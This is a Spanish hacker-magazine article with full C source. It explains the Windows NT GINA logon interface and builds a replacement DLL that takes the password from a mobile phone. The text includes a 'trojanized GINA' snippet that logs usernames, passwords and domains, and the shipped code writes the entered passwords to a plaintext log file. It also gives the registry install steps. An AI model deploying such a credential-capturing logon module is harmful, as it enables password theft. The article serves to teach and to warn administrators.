@@ -1,0 +1,752 @@
+-[ 0x06 ]--------------------------------------------------------------------
+-[ GINA y moviles ]----------------------------------------------------------
+-[ by FCA00000 ]-----------------------------------------------------SET-30--
+
+/*
+Una vez más, me presento ante vosotros para explicar un concepto de seguridad
+de Windows NT, llamado GINA: Graphical Identification and Authentication.
+En pocas palabras, GINA es el modelo de login interactivo. Gracias a que
+es extendible, se puede programar otro mecanismo de autentificación que
+extienda o reemplace al definido normalmente en Windows NT.
+
+Por ejemplo, las tarjetas inteligentes SmartCard, o los de reconocimiento
+de la huella dactilar, o autentificación en sub-dominios, se llevan a cabo
+mediante GINA.
+
+En este artículo, voy a hacer que el nombre de usuario se pida mediante
+el diálogo normal de windows, pero la clave se solicite a traves del
+teléfono móvil.
+
+La mayoría de los datos necesarios para entender GINA los he sacado de un
+ejemplo llamado GINASTUB y GINA que se encuentran en el DDK de WindowsNT.
+Agradezco a sus autores la claridad con que estan presentados.
+
+Existe una librería en Windows llamada MSGINA que es invocada por el programa
+Winlogon para que el usuario presente sus credenciales. Para realmente
+validar al usuario, usa la función LogonUser .
+
+Pero en un substituto de MSGINA, lo que hay que hacer es proporcionar nuestra
+propia autentificación. Además de esto, el usuario debe estar definido
+en Windows, o si no hay que proveer mucha más funcionalidad. Por ejemplo, las
+horas en las que el usuario puede acceder, el directorio inicial, ...
+Para no complicarnos la vida en exceso, lo que voy a hacer es un nuevo GINA
+llamado FCA_GINA que llamará a las funciones orginales de MSGINA, excepto
+cuando el usuario pretende meter su clave, que entonces conectará con el móvil.
+
+Esto hay que hacerlo porque GINA no solo provee funciones para logon, sino
+tambien para el salvapantallas, logoff, bloqueo del terminal, apagado, y
+algunas más. Si quieres implementar una, tienes que definir todas.
+
+Así que tan pronto como sea posible (y este momento es cuando Winlogon
+llama a nuestra función WlxNegotiate) hay que cargar la librería
+original MSGINA.DLL y obtener punteros a sus funciones.
+Para eso, se usan las funciones LoadLibrary y GetProcAddress.
+
+A partir de entonces el sistema nos irá llamando. Por ejemplo, cuando
+el usuario esta inactivo más de un tiempo establecido, llamará a la
+funcion WlxScreenSaverNotify. En nuestro caso, como no queremos hacer
+nada especial, simplemente llamamos a la función original con los
+mismos parametros:
+BOOL WINAPI WlxScreenSaverNotify(
+ PVOID pWlxContext,
+ BOOL * pSecure
+ )
+{
+ return GWlxScreenSaverNotify( pWlxContext, pSecure );
+}
+
+Notar que esto tiene un claro comportamiento erroneo: si el sistema tiene ya
+definido un sustituto para MSGINA, por ejemplo para un sistema que muestra
+un salvapantallas distinto, y con nombre GINA_EXT, lo que hacemos en
+realidad es llamar al MSGINA después de nuestro manejo (inexistente) del
+evento WlxScreenSaverNotify, cuando lo correcto sería llamar al
+GINA_EXT.WlxScreenSaverNotify
+
+Pero sigamos con lo que interesa.
+Lo gracioso está en la función de login: WlxLoggedOutSAS
+Los parámetros que Winlogon nos manda son:
+ PVOID pWlxContext = Contexto de la ventana.
+ DWORD dwSasType = tipo de evento. Es WLX_SAS_TYPE_CTRL_ALT_DEL para login
+ PLUID pAuthenticationId = identificador de autentificación. Podemos
+    cambiar las estadísticas del usuario, por ejemplo la hora de último login
+ PSID pLogonSid = identificador de seguridad. Número único para cada sesión.
+ PDWORD pdwOptions = opciones para el logon, por ejemplo para cargar el perfil
+ PHANDLE phToken = handle representando el usario que ha accedido.
+ PWLX_MPR_NOTIFY_INFO pMprNotifyInfo = puntero al nombre, dominio, y clave.
+    Se usa si tenemos que acceder a otro dominio. Nosotros lo usaremos.
+ PVOID *pProfile = tipo, y datos del perfil. Dejaremos que MSGINA lo maneje.
+
+El parametro de salida es
+WLX_SAS_ACTION_LOGON	El usuario ha accedido.
+WLX_SAS_ACTION_NONE	El intento de acceso no tiene éxito.
+WLX_SAS_ACTION_SHUTDOWN	El usuario ha solicitado apagar el sistema. Supongo
+   que es de todos conocido que existe una opcion del registro llamada
+   ShutdownWithoutLogon que permite apagar el sistema sin necesidad de logon.
+
+Si queremos mostrar más información, o la razón por la que el usuario no
+puede conectar (ej. El móvil no esta enchufado) podemos mostrar un diálogo.
+Dado que en este momento no existe todavía un entorno (desktop) de usuario, no
+se pueden usar las funciones MessageBox y DialogBox, así que hay que usar
+otras equivalentes llamadas WlxMessageBox y WlxDialogBox. Por supuesto, también
+tenemos nuestra propia ventana, asi que podemos mostrar allí cualquier otra
+cosa, tal como un dibujo, o un dialogo a nuestra medida. Esto es lo que
+hace el ejemplo GINA incluido en el DDK.
+
+Pero para mantener las cosas simples, yo voy a llamar al diálogo estandar
+de Windows, a traves de su puntero original GWlxLoggedOutSAS:
+ int iRet;
+
+ iRet = GWlxLoggedOutSAS( pWlxContext, dwSasType, pAuthenticationId,
+                pLogonSid, pdwOptions, phToken, pMprNotifyInfo, pProfile );
+
+que me devolvera iRet == WLX_SAS_ACTION_LOGON
+cuando el usario ha escrito su nombre y su clave (que será vacía).
+
+A partir de ahí ya es todo mío: la estructura  pMprNotifyInfo  me proporciona
+acceso al nombre de usuario, clave, y dominio.
+
+Si fuera un programador malévolo, podría crear un GINA troyanizado que
+escribiera en un fichero esta información:
+ if(iRet == WLX_SAS_ACTION_LOGON)
+  {
+  ap=fopen("FCA_GINA.log","a+");
+  fprintf(ap,"Usuario = %s\n", pMprNotifyInfo->pszUserName[i] );
+  fprintf(ap,"Clave = %s\n", pMprNotifyInfo->pszPassword[i] );
+  fprintf(ap,"Dominio = %s\n", pMprNotifyInfo->pszDomain[i] );
+  fclose(ap);
+  }
+y no tendría más que pedir a un administrador que usara mi ordenador para
+así averiguar su clave. Bueno, estoy pensando en un entorno corporativo
+donde hay cientos de ordenadores y los usuarios no tienen permisos locales
+de administrador, claro.
+
+As;i que confío en que los administradores de servidores NT (que espero lean
+éste artículo) vigilen que no hay un GINA instalado en su sistema.
+
+Vamos a lo nuestro, que ando otra vez por las ramas.
+Como describí en un artículo anterior, es posible usar comandos AT para
+manejar la tarjeta SIM albergada en un teléfono móvil Siemens-S45 conectado
+al ordenador.
+Cuando digo "conectado", me refiero a 2 metodos:
+-El primero es mediante la red de telefonía. Es decir, mandando
+ un SMS que pedirá la  clave en la pantalla del móvil.
+ Este metodo no es efectivo, porque puede haber un retraso de varios minutos, y
+ ademas, se supone que el usuario  esta delante del ordenador, no?
+ Sin embargo, podría ser útil para autorización remota del ordenador.
+ Por ejemplo, un usuario necesita la clave de su jefe para acceder.
+ Asi que se sienta delante del ordenador, y escribe su nombre.
+ El ordenador tiene un módem (o un teléfono móvil) que manda un SMS al
+ teléfono del jefe.
+ Este responde con otro SMS que tiene la clave, y que el módem recibe.
+ Extrae la clave, se completan los datos de autentificación, y el usuario
+ accede al ordenador.
+-El segundo es mediante cable o infrarrojos. En este escenario, todos los
+ usuarios disponen de un teléfono con capacidad de conectarse (si es por
+ infrarrojos, mejor, pues prácticamente todos los móviles tienen infrarrojos)
+ El usuario escribe su nombre en el ordenador (este paso puede
+ ser omitido, ya que el nombre de usuario se puede almacenar en el movil).
+ Despues, apunta su móvil hacia el puerto del ordenador.
+ El ordenador encuentra el móvil, y tras el establecimiento del protocolo,
+ le pide al móvil que solicite la clave al usuario. La clave se devuelve
+ al ordenador, que completa el proceso de login.
+
+En este punto hay varias alternativas:
+-la clave se almacena en el móvil. El usuario no necesita recordarla. Lo malo
+ es que si le roban el teléfono al usuario, el ladrón puede acceder al sistema.
+ La clave no tiene porqué ser un numero. Por ejemplo, puede ser el propio
+ número de telefono, o una registro en la agenda de direcciones.
+-la clave es el PIN. La validación se realiza internamente en el móvil, y
+ el ordenador recibe la confirmación de que el usuario conoce su propio PIN.
+ Con este metodo, la autentificación queda delegada en el móvil. Esto
+ permite usar los mecanismos de seguridad del SIM.
+-la clave se almacena en el ordenador. El móvil sirve unicamente para
+ escribirla, y el ordenador tiene que validarla. Esto permite que la clave
+ se pueda transmitir a otros ordenadores, por ejemplo si es necesaria
+ autentificación en otros dominios.
+ Este procedimiento es el que voy a usar. No es el más seguro, ya que la clave
+ se transmite sin codificar, pero es el que mejor ilustra el proceso.
+
+Así que el punto de entrada es la función obtener_clave_movil.
+Solo por comodidad, esta funcion llama a otra llamada  main   .
+Tengo que compilar FCA_GINA como una DLL, pero nadie me impide que también
+lo convierta en un progama. Así me resulta más fácil debugear, antes de
+instalarla adecuadamente.
+Tenemos que   main   se encarga de abrir el puerto de comunicaciones COM4.
+Mi ordenador tiene 1 puerto serie y otro de infrarrojos. Gracias al programa
+IrCOMM2k , se convierte el puerto infrarrojos en COM4 que puedo abrir con
+ttyfd = CreateFile ("COM4", GENERIC_READ, ...
+
+y puedo establecer los parametros con
+GetCommState(ttyfd, &dcb);
+seguido de
+dcb.BaudRate = CBR_57600;
+y similares, finalizando con
+SetCommState(ttyfd, &dcb);
+
+Tambien me interesa cambiar los tiempos de time-out:
+ctTimeOuts.ReadIntervalTimeout = 100;
+SetCommTimeouts(ttyfd, &ctTimeOuts);
+
+Declaro los datos que quiero mandar:
+strcpy(tmpbuf, "at^sstk=22,0\r" );
+y los escribo en el puerto con
+WriteFile(ttyfd, tmpbuf, ...
+
+La segunda parte del comando es la que vale para que el SIM solicite la clave.
+Para el formato y su significado, ver el artículo de esta misma entrega, que
+creo que se llamará "moviles3" o "SIM application Toolkit".
+En la pantalla del móvil sólo aparece la pregunta "SI?" que es poco
+informativa, ya lo sé. También podría haber hecho que sonara un pitido, pero
+no quiero complicar la cosa.
+La clave tiene un mínimo de 5 y un máximo de 8 caracteres numéricos.
+El usuario ve lo que está escibiendo. Es posible hacer que cada pulsación de
+tecla muestre un asterisco, pero es mejor así.
+
+
+Ahora solo tengo que esperar la respuesta:
+ReadFile(ttyfd, ...
+
+Gracias al timeout, cada 1000 milisegundos miramos a ver si hay un dato
+para nosotros. Si no, decremento el contador del bucle y sigo.
+Esto quiere decir que el usuario tiene 20 segundos para escribir la clave.
+
+Cuando se ha escrito y pulsado el boton "OK" del móvil, se responde con
+el comando
+^SSTK: 8103012300820282818301008D0704303030303030
+si la clave es '000000'
+Esto corresponde a las ultimas cifras 30 30 30 30 30 30
+Así que saco los caracteres de 2 en 2 a partir de la posición 32 tras '^SSTK:'
+Ya sé que podría interpretar el resultado segun el formato, pero esto es
+sólo para mostrar como se hace.
+
+La clave la almaceno en una variable global.
+Esto es una metodología sumamente peligrosa, pues queda en memoria
+durante toda la sesión, con el riesgo de que el siguiente
+usuario en usar el ordenador la pueda extraer analizando toda la memoria.
+
+Ya puedo retornar a la rutina para evaluar si la clave es correcta.
+
+En mi caso, lo que hago es llamar otra vez a Windows para que me diga si
+existe un usuario "securizado" y la clave es correcta.
+Supongamos que el usuario se llama "prueba" , y lo hemos autentificado
+correctamente con la primera llamada a GWlxLoggedOutSAS. Bueno, pues si
+el usuario ha metido la clave mediante el móvil, entonces intento
+autentificar a "prueba_seguro" con la clave introducida.
+strcat(pMprNotifyInfo->pszUserName, "_seguro" );
+strcpy(pMprNotifyInfo->pszPassword, clave_movil );
+
+Y llamo a
+ iRet = GWlxLoggedOutSAS(
+ pWlxContext,
+ dwSasType,
+ pAuthenticationId,
+ pLogonSid,
+ pdwOptions,
+ phToken,
+ pMprNotifyInfo,
+ pProfile
+ );
+
+Si esta segunda autentificación tiene éxito, devolvera WLX_SAS_ACTION_LOGON.
+Si algo ha ido mal durante el proceso, se devuelve WLX_SAS_ACTION_NONE
+
+Para probarlo, hay que seguir los pasos para instalación de GINA. En breve, esto
+es copiar la DLL al directorio local \WINNT\System32  y
+crear una nueva clave REG_SZ en el registro
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+llamada GinaDLL con el nombre de nuestra libreria, en este caso FCA_GINA
+Así se entiende que no puede haber 2 librerías de autentificación alternativa.
+Si tienes, por ejemplo, un sistema de SmartCard, no puedes apilarlo sobre
+un sistema de huella digital.
+Similarmente, no es posible usarlos alternativamente, es decir, que unos
+usuarios usen uno, y otros usen otro.
+La solución a esto es que el nuevo sistema de autentificación guarde nota del
+sistema anterior, antes de copiarse en \WINNT\System32  , y que lo invoque
+cada vez que haya acabado con su propia autentificación.
+
+
+Hay muchas cosas a tener en cuenta.
+
+Lo primero es que la librería se llama cuando intentas acceder al sistema. Si
+te equivocas en el programa y no funciona, seras incapaz de entrar.
+Por eso yo he puesto una doble medida: si hay un disquete en la disquetera
+y existe un archivo llamado "si.txt", entonces se intenta la autentificación
+mediante el móvil. En un entorno real de producción debe ser justo lo opuesto.
+Por ejemplo, Administrador debería ser capaz de entrar aunque no tenga móvil.
+Esto servirá también para el caso en que el puerto deja de funcionar.
+
+Segundo: la librería declarada en el registro debe existir en \WINNT\System32
+o de lo contrario Windows se negará a autentificar a cualquier usuario.
+En el manual dice que si no funciona correctamente, lo mejor es borrarla, pues
+así no se usara. Mentira. Si la borras, Winlogon no deja entrar a nadie.
+
+Tercero: imagínate que no funciona como esperas. Gracias a que has seguido
+la primera indicación, eres capaz de entrar "por la puerta de atrás". Pero
+cuando haces los cambios, e intentas instalar la librería modificada, Windows
+te dice que no es posible sobre-escribir el archivo porque esta siendo usado.
+La solución es tener un sistema dual de arranque, por ejemplo otra partición
+con Windows que permita acceder a la primera. Lo malo es que cada vez que
+haces un cambio, eso implica arrancar el otro sistema, copiar la nueva
+librería, y arrancar de nuevo con el sistema de prueba. Para que sirva
+de escarmiento, yo he tenido que hacer eso unas 7-8 veces.
+
+Para saber por dónde va tu programa, puedes usar ventanas de diálogo, o bien
+escribir la traza en un fichero. Eso facilita las cosas, pues si compartes
+la unidad \WINNT\System32  , puedes verla desde otro ordenador, a pesar de
+que no haya ningun usuario "logueado" en el ordenador de prueba.
+
+Por supuesto, la manera de atenuar los riesgos anteriores es usar el debugger
+para Windows  NTSD. Cualquier otro posiblemente necesite que el usuario
+haya iniciado una sesión, asi que no valen. Animo; NTSD no es tan dificil, y
+es el debugger usado en la propia Microsoft.
+
+La documentacion de GINA dice "en sistemas compartidos antiguos, los usuarios
+podían ir a un terminal aparentemente no usado, y al pulsar la tecla ENTER se
+les solicitaba su usuario y clave. El problema con esto era que en realidad
+había un Caballo de Troya que recogía la clave pero indicaba que era errónea.
+El resultado era que el usuario le había proporcionado su clave a otro.
+En Windows NT, los usuarios pueden usar una Secuencia de Atención Segura, a
+la que ningun Caballo de Troya puede acceder. Eso se hace con CTRL+ALT+DEL."
+Y yo me pregunto: ?que es GINA, sino una puerta para caballos de troya?
+De acuerdo que el usuario necesita tener permiso para copiar archivos a
+sistema, y para crear claves del registro, pero eso tampoco es inhabitual.
+
+En resúmen, es sencillo modificar los sistemas de login y sustituirlos
+por uno hecho a medida.
+
+
+
+
+Relacionado con este tema, hay otra posibilidad llamada SubAutentificación.
+Sirve solo para autentificar, sin la parte del interface
+gráfico, ni la gestión de logoff o el salvapantallas.
+Lo bueno es que puede apilarse sobre otros mecanismos.
+
+Para que funcione, debe haber un dato llamado "Authentication Packages"
+con el valor   msv1_0 en la rama
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+
+Entonces en la rama del registro
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
+se encuentran una lista de DLL que permiten autentificación.
+
+Por ejemplo, en mi sistema hay definidas:
+-FPNWCLNT para clientes NetWare
+-RASSFM para clientes de acceso telefónico
+-IISSUBA para el servidor web (cuando actúa como cliente del Sistema Operativo)
+
+
+Cuando se intenta entrar al ordenador, un subsistema puede solicitar un
+metodo de autentificación particular. Entonces se carga la librería
+y se ejecuta el metodo Msv1_0SubAuthenticationRoutine.
+Eso es lo que hace RAS, por ejemplo. Como no se le puede pressentar al usuario
+una ventana de login en el ordenador servidor, la clave se solicita en el cliente
+y se envía mediante el módem hacia el ordenador servidor, quien la verifica.
+
+Entonces la librería decide dejar entrar al usuario, o no.
+A diferencia de GINA, el usuario ya ha sido localizado en el dominio, por
+lo que ésta rutina puede solamente re-confirmar el acceso, o bien denegarlo.
+Es por esto que las credenciales del usuario ya estan disponibles, y la
+clave en limpio no se puede usar, sino que hay que usar el hash.
+Notar que el usuario todavía no esta autentificado. Esto es lo que
+precisamente tenemos que hacer.
+
+Grosso modo, hay que definir
+NTSTATUS
+NTAPI
+Msv1_0SubAuthenticationRoutine (
+    IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
+    IN PVOID LogonInformation,
+    IN ULONG Flags,
+    IN PUSER_ALL_INFORMATION UserAll,
+    OUT PULONG WhichFields,
+    OUT PULONG UserFlags,
+    OUT PBOOLEAN Authoritative,
+    OUT PLARGE_INTEGER LogoffTime,
+    OUT PLARGE_INTEGER KickoffTime
+)
+{
+    // en este ejemplo tonto, nunca dejamos entrar al usuario "prueba"
+    if ( UserAll->UserId != DOMAIN_USER_RID_ADMIN &&
+         strcmp(UserAll->UserName.Buffer,"prueba")!=0 )
+	{
+            *Authoritative = TRUE;
+            return STATUS_INVALID_LOGON_HOURS;
+	}
+    else
+	{
+            *Authoritative = TRUE;
+            return STATUS_SUCCESS;
+	}
+}
+
+
+La rama
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\Auth0
+es especial. En vez de tener que ser invocada por un subsistema, es
+invocada por todos los sistemas, después de que el acceso ha sido dado.
+En otras palabras, es un filtro adicional.
+En lugar de llamar a la función anterior, se llamará a
+NTSTATUS
+NTAPI
+Msv1_0SubAuthenticationFilter(
+    IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
+    IN PVOID LogonInformation,
+    IN ULONG Flags,
+    IN PUSER_ALL_INFORMATION UserAll,
+    OUT PULONG WhichFields,
+    OUT PULONG UserFlags,
+    OUT PBOOLEAN Authoritative,
+    OUT PLARGE_INTEGER LogoffTime,
+    OUT PLARGE_INTEGER KickoffTime
+);
+
+
+Para los administradores que deseen imponer mas restricciones al login, este
+es el sitio adecuado.
+
+*/
+
+#include <windows.h>
+#include <stdio.h>
+#include <winwlx.h>
+
+typedef BOOL (WINAPI *PGWLXNEGOTIATE)( DWORD, DWORD* );
+typedef BOOL (WINAPI *PGWLXINITIALIZE)( LPWSTR, HANDLE, PVOID, PVOID, PVOID* );
+typedef VOID (WINAPI *PGWLXDISPLAYSASNOTICE)( PVOID );
+typedef int (WINAPI *PGWLXLOGGEDOUTSAS)( PVOID, DWORD, PLUID, PSID, PDWORD,
+ PHANDLE, PWLX_MPR_NOTIFY_INFO, PVOID *);
+typedef BOOL (WINAPI *PGWLXACTIVATEUSERSHELL)( PVOID, PWSTR, PWSTR, PVOID );
+typedef int (WINAPI *PGWLXLOGGEDONSAS)( PVOID, DWORD, PVOID );
+typedef VOID (WINAPI *PGWLXDISPLAYLOCKEDNOTICE)( PVOID );
+typedef int (WINAPI *PGWLXWKSTALOCKEDSAS)( PVOID, DWORD );
+typedef BOOL (WINAPI *PGWLXISLOCKOK)( PVOID );
+typedef BOOL (WINAPI *PGWLXISLOGOFFOK)( PVOID );
+typedef VOID (WINAPI *PGWLXLOGOFF)( PVOID );
+typedef VOID (WINAPI *PGWLXSHUTDOWN)( PVOID, DWORD );
+typedef BOOL (WINAPI *PGWLXSCREENSAVERNOTIFY)( PVOID, BOOL * );
+typedef BOOL (WINAPI *PGWLXSTARTAPPLICATION)( PVOID, PWSTR, PVOID, PWSTR );
+
+PWLX_DISPATCH_VERSION_1_0 g_pWinlogon;
+
+// Punteros globales a las direcciones originales
+PGWLXNEGOTIATE GWlxNegotiate;
+PGWLXINITIALIZE GWlxInitialize;
+PGWLXDISPLAYSASNOTICE GWlxDisplaySASNotice;
+PGWLXLOGGEDOUTSAS GWlxLoggedOutSAS;
+PGWLXACTIVATEUSERSHELL GWlxActivateUserShell;
+PGWLXLOGGEDONSAS GWlxLoggedOnSAS;
+PGWLXDISPLAYLOCKEDNOTICE GWlxDisplayLockedNotice;
+PGWLXWKSTALOCKEDSAS GWlxWkstaLockedSAS;
+PGWLXISLOCKOK GWlxIsLockOk;
+PGWLXISLOGOFFOK GWlxIsLogoffOk;
+PGWLXLOGOFF GWlxLogoff;
+PGWLXSHUTDOWN GWlxShutdown;
+PGWLXSTARTAPPLICATION GWlxStartApplication;
+PGWLXSCREENSAVERNOTIFY GWlxScreenSaverNotify;
+
+char clave_movil[] = "00000000000000000000000000000000000000000000000";
+
+int main(int argc, char *argv[])
+{
+ DWORD actual;
+ int datos = 0, otra_vez=20, i;
+ HANDLE ttyfd;
+ DCB dcb;
+ COMMTIMEOUTS ctTimeOuts;
+ char tmpbuf[200] = {0,};
+ char *p;
+ char CTRL_Z[] = {0x1A, 0x00};
+ FILE *ap;
+
+ ttyfd = CreateFile ("COM1", GENERIC_READ | GENERIC_WRITE,
+	0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+ GetCommState(ttyfd, &dcb);
+ dcb.fBinary = TRUE; dcb.BaudRate = CBR_57600; dcb.fParity = FALSE;
+ dcb.Parity = 0; dcb.ByteSize = 8; dcb.StopBits = 1;
+
+ SetCommState(ttyfd, &dcb);
+ ctTimeOuts.ReadIntervalTimeout = 100;
+ ctTimeOuts.ReadTotalTimeoutMultiplier = 1;
+ ctTimeOuts.ReadTotalTimeoutConstant = 1000;
+ ctTimeOuts.WriteTotalTimeoutMultiplier = 1;
+ ctTimeOuts.WriteTotalTimeoutConstant = 5000;
+ SetCommTimeouts(ttyfd, &ctTimeOuts);
+
+ Sleep(500);
+
+ PurgeComm(ttyfd, PURGE_RXABORT | PURGE_RXCLEAR);
+
+ strcpy(tmpbuf, "at^sstk=22,0\r" );
+ WriteFile(ttyfd, tmpbuf, strlen(tmpbuf), &actual, NULL);
+ Sleep(500);
+
+ strcpy(tmpbuf, "D0138103012300820281028D040453493F11020508" );
+ strcat(tmpbuf, CTRL_Z );
+ WriteFile(ttyfd, tmpbuf, strlen(tmpbuf), &actual, NULL);
+ Sleep(500);
+
+ while(otra_vez)
+ {
+  ReadFile(ttyfd, tmpbuf, sizeof(tmpbuf), &actual, NULL);
+  otra_vez--;
+  if(strchr(tmpbuf, ':')!=NULL )
+   {
+   otra_vez = 0;
+   }
+  };
+ p=strchr(tmpbuf, ':');
+ i=0;
+ // los primeros 32 caracteres tras el 'SSTK :' son 
+ // cabeceras del protocolo
+ for(datos=32;datos<52;datos+=2)
+  {
+  if(p[datos]==0)
+   break;
+  if(p[datos]!='3') //los caracteres son '3x' donde x es la tecla
+   break;
+  clave_movil[i++]=p[datos+1];
+  }
+ clave_movil[i++]=0;
+ printf("clave_movil=%s\n", clave_movil );
+ ap=fopen("FCA_GINA.log","a+");
+ fprintf(ap,"clave_movil =%s\n", clave_movil );
+ fclose(ap);
+ close(ttyfd);
+
+}
+
+int obtener_clave_movil()
+{
+main(0,NULL);
+return 0;
+}
+
+BOOL
+inicializa( void )
+{
+ HINSTANCE hDll;
+	
+ hDll = LoadLibrary( TEXT("MSGINA.DLL") );
+
+ // Obtener las direcciones de las funciones originales
+ GWlxNegotiate = (PGWLXNEGOTIATE)GetProcAddress( hDll, "WlxNegotiate" );
+ GWlxInitialize = (PGWLXINITIALIZE)GetProcAddress( hDll, "WlxInitialize" );
+ GWlxDisplaySASNotice =
+	(PGWLXDISPLAYSASNOTICE)GetProcAddress( hDll, "WlxDisplaySASNotice" );
+ GWlxLoggedOutSAS =
+	(PGWLXLOGGEDOUTSAS)GetProcAddress( hDll, "WlxLoggedOutSAS" );
+ GWlxActivateUserShell =
+	(PGWLXACTIVATEUSERSHELL)GetProcAddress( hDll, "WlxActivateUserShell" );
+ GWlxLoggedOnSAS = (PGWLXLOGGEDONSAS)GetProcAddress( hDll, "WlxLoggedOnSAS" );
+ GWlxDisplayLockedNotice =
+	(PGWLXDISPLAYLOCKEDNOTICE)GetProcAddress( hDll, "WlxDisplayLockedNotice");
+ GWlxIsLockOk = (PGWLXISLOCKOK)GetProcAddress( hDll, "WlxIsLockOk" );
+ GWlxWkstaLockedSAS =
+	(PGWLXWKSTALOCKEDSAS)GetProcAddress( hDll, "WlxWkstaLockedSAS" );
+ GWlxIsLogoffOk = (PGWLXISLOGOFFOK)GetProcAddress( hDll, "WlxIsLogoffOk" );
+ GWlxLogoff = (PGWLXLOGOFF)GetProcAddress( hDll, "WlxLogoff" );
+ GWlxShutdown = (PGWLXSHUTDOWN)GetProcAddress( hDll, "WlxShutdown" );
+ GWlxStartApplication =
+	(PGWLXSTARTAPPLICATION) GetProcAddress( hDll, "WlxStartApplication" );
+ GWlxScreenSaverNotify =
+	(PGWLXSCREENSAVERNOTIFY) GetProcAddress( hDll, "WlxScreenSaverNotify" );
+
+ return TRUE;
+}
+
+BOOL WINAPI WlxNegotiate(
+ DWORD dwWinlogonVersion,
+ DWORD *pdwDllVersion)
+{
+ if( !inicializa() )
+ return FALSE;
+
+ return GWlxNegotiate( dwWinlogonVersion, pdwDllVersion );
+}
+
+BOOL WINAPI WlxInitialize(
+ LPWSTR lpWinsta,
+ HANDLE hWlx,
+ PVOID pvReserved,
+ PVOID pWinlogonFunctions,
+ PVOID *pWlxContext)
+{
+ return GWlxInitialize(
+ lpWinsta,
+ hWlx,
+ pvReserved,
+ pWinlogonFunctions,
+ pWlxContext
+ );
+}
+
+int WINAPI WlxLoggedOutSAS(
+ PVOID pWlxContext,
+ DWORD dwSasType,
+ PLUID pAuthenticationId,
+ PSID pLogonSid,
+ PDWORD pdwOptions,
+ PHANDLE phToken,
+ PWLX_MPR_NOTIFY_INFO pMprNotifyInfo,
+ PVOID *pProfile)
+{
+ int iRet;
+
+ iRet = GWlxLoggedOutSAS(
+ pWlxContext,
+ dwSasType,
+ pAuthenticationId,
+ pLogonSid,
+ pdwOptions,
+ phToken,
+ pMprNotifyInfo,
+ pProfile
+ );
+
+ if(iRet == WLX_SAS_ACTION_LOGON) {
+
+		int lll, i;
+		FILE *ap;
+
+		ap=fopen("a:\\si.txt","r");
+		if(ap!=NULL)
+			{
+			fclose(ap);
+			}
+		else
+			{
+			return iRet;
+			}
+
+		lll=wcslen(pMprNotifyInfo->pszPassword);
+		ap=fopen("FCA_GINA.log","a+");
+		fprintf(ap,"pszPassword = %s\n", pMprNotifyInfo->pszPassword );
+		fclose(ap);
+
+		i=obtener_clave_movil(0, NULL);
+		lll=strlen(clave_movil);
+
+		strcat(pMprNotifyInfo->pszUserName, "_seguro" );
+		strcpy(pMprNotifyInfo->pszPassword, clave_movil );
+
+		iRet = GWlxLoggedOutSAS(
+		 pWlxContext,
+		 dwSasType,
+		 pAuthenticationId,
+		 pLogonSid,
+		 pdwOptions,
+		 phToken,
+		 pMprNotifyInfo,
+		 pProfile
+		 );
+ // pMprNotifyInfo->pszUserName
+ // pMprNotifyInfo->pszDomain
+ // pMprNotifyInfo->pszPassword
+ // pMprNotifyInfo->pszOldPassword
+
+ }
+
+ return iRet;
+}
+
+// A partir de aqui, simplemente llaman a la funcion original
+
+VOID WINAPI WlxDisplaySASNotice(
+ PVOID pWlxContext)
+{
+ GWlxDisplaySASNotice( pWlxContext );
+}
+
+BOOL WINAPI WlxActivateUserShell(
+ PVOID pWlxContext,
+ PWSTR pszDesktopName,
+ PWSTR pszMprLogonScript,
+ PVOID pEnvironment)
+{
+ return GWlxActivateUserShell(
+ pWlxContext,
+ pszDesktopName,
+ pszMprLogonScript,
+ pEnvironment
+ );
+}
+
+int WINAPI WlxLoggedOnSAS(
+ PVOID pWlxContext,
+ DWORD dwSasType,
+ PVOID pReserved)
+{
+ return GWlxLoggedOnSAS( pWlxContext, dwSasType, pReserved );
+}
+
+VOID WINAPI WlxDisplayLockedNotice(
+ PVOID pWlxContext )
+{
+ GWlxDisplayLockedNotice( pWlxContext );
+}
+
+BOOL WINAPI WlxIsLockOk(
+ PVOID pWlxContext)
+{
+ return GWlxIsLockOk( pWlxContext );
+}
+
+int WINAPI WlxWkstaLockedSAS(
+ PVOID pWlxContext,
+ DWORD dwSasType )
+{
+ return GWlxWkstaLockedSAS( pWlxContext, dwSasType );
+}
+
+BOOL WINAPI WlxIsLogoffOk(
+ PVOID pWlxContext
+ )
+{
+ BOOL bSuccess;
+
+ bSuccess = GWlxIsLogoffOk( pWlxContext );
+
+ return bSuccess;
+}
+
+VOID WINAPI WlxLogoff(
+ PVOID pWlxContext
+ )
+{
+ GWlxLogoff( pWlxContext );
+}
+
+VOID WINAPI WlxShutdown(
+ PVOID pWlxContext,
+ DWORD ShutdownType
+ )
+{
+ GWlxShutdown( pWlxContext, ShutdownType );
+}
+
+BOOL WINAPI WlxScreenSaverNotify(
+ PVOID pWlxContext,
+ BOOL * pSecure
+ )
+{
+ return GWlxScreenSaverNotify( pWlxContext, pSecure );
+}
+
+BOOL WINAPI WlxStartApplication(
+ PVOID pWlxContext,
+ PWSTR pszDesktopName,
+ PVOID pEnvironment,
+ PWSTR pszCmdLine
+ )
+{
+ return GWlxStartApplication(
+ pWlxContext,
+ pszDesktopName,
+ pEnvironment,
+ pszCmdLine
+ );
+}
+
+*EOF*
